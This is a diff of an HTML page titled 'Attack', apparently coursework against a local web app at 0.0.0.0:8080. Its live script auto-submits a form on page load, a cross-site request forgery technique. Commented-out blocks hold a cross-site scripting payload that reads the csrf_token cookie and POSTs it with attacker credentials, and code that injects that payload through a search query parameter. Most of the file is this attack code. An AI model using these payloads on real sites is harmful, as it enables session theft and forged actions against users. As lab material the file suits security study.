@@ -1,22 +1,23 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 
 <head>
 
     <title>Attack</title>
     <script type="module" src="/path/to/js.cookie.mjs"></script>
-    <script nomodule defer src="/path/to/js.cookie.js"></script>
-    <link href="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.0.0/css/bootstrap.min.css" rel="stylesheet"
-        media="screen">
+    <link href="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.0.0/css/bootstrap.min.css" rel="stylesheet" media="screen">
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/js-cookie@rc/dist/js.cookie.min.js"></script>
 
     <script>
 
-        // document.getElementsByClassName("form-inline")[0].submit();
-        //  var csrf_token_val = document.getElementsByName('csrf_token').innerHTML;
+        // window.onload = function () {
+        //     document.getElementsByClassName("form-inline")[0].submit();
+        //     alert("HI");
+        // };
+        
         // console.log(csrf_token_val);
-        window.onload = function () {
+        // window.onload = function () {
             // alert("HI");
             // var csrf_token_val = document.getElementsByName('csrf_token');
             // console.log(csrf_token_val);
@@ -24,25 +25,75 @@
             // console.log(csrf_token_val);
             
 
-            var formObj = document.getElementsByClassName('well');
-            alert("Input one value: " + formObj.csrf_token.value);
+            // var formObj = document.getElementsByClassName('well');
+            // var csrf_token_val = document.getElementsByName('csrf_token');
+            // let x = document.cookie;
+            // const cDecoded = decodeURIComponent(document.cookie);
+            
+            // function getValue() {
+            //     alert("HI");
+                
+            // }
+            // document.getElementsByClassName("form-inline")[0].submit();
+
+            // var ca = document.cookie.split(';');
+            // alert(ca)
+            // alert(csrf_token_val)
+            // alert("Input one value: " + formObj.csrf_token.value);
+
             
 
          
-   
+            // document.getElementsByClassName("form-inline")[0].submit();
 
+
+        // };
+
+
+        //payload
+		// <script>
+        //     window.onload = function(){ 
+        //         var cookie = Cookie.get('csrf_token');
+        //         var params = 'username=attacker&password=URpwn3d&cookie=' + cookie; 
+        //         var theUrl = 'http://0.0.0.0:8080/login';
+        //         var xmlHttp = new XMLHttpRequest();
+        //         xmlHttp.open( 'POST', theUrl, true );
+        //         xmlHttp.send(params);
+        //     };
+      
+	
+
+
+        //Submit a get request and then within it get the username, password, and cookie
+        // window.onload = function () {
+        //         var payload_1 = "<script> window.onload = function(){ var cookie = document.cookie.split(';')[1].split('=')[1]; alert(cookie); ";
+        //         var payload_2 = "var params = 'username=attacker&password=URpwn3d&cookie=' + cookie; var theUrl = 'http://0.0.0.0:8080/login';";
+        //         var payload_3 = "var xmlHttp = new XMLHttpRequest();xmlHttp.open( 'POST', theUrl, true );xmlHttp.send(params);";
+        //         var payload = payload_1 + payload_2 + payload_3;
+        //         var test = "http://0.0.0.0:8080/search?q= <script> window.onload = function(){ var cookie = document.cookie.split(';')[1].split('=')[1]; alert(cookie);var params = 'username=attacker&password=URpwn3d&cookie=' + cookie; var theUrl = 'http://0.0.0.0:8080/login';var xmlHttp = new XMLHttpRequest();xmlHttp.open( 'POST', theUrl, true );xmlHttp.send(params);";
+                
+        //         var theUrl = "http://0.0.0.0:8080/search?q=" + payload;
+        //         var xmlHttp = new XMLHttpRequest();
+        //         xmlHttp.open("GET", theUrl, true);
+        //         xmlHttp.send(null);
+        // };
+        window.onload = function () {
+                document.getElementsByClassName("form-inline")[0].submit();
 
         };
+
+
     </script>
 </head>
 
 <body>
-    <div class="col-xs-4">
 
+    <div class="col-xs-4">
         <!-- Login / create account form -->
         <div class="well">
-            <form action="http://0.0.0.0:8080/login" method="post" class="form-inline">
-                <input type="hidden" name="csrf_token" id="test">
+            <!-- <form action="http://0.0.0.0:8080/search?q=" method="get" class="form-inline"> -->
+                <form action="http://0.0.0.0:8080/search?q=jack" method="get" class="form-inline"></form>
+                <input type="hidden" name="csrf_token">
                 <p>Log in or create an account.</p>
                 <div class="form-group form-space">
                     <input id="username" name="username" type="text" placeholder="Username" required
@@ -54,7 +105,6 @@
                 </div>
             </form>
         </div>
-
     </div>
 
 </body>
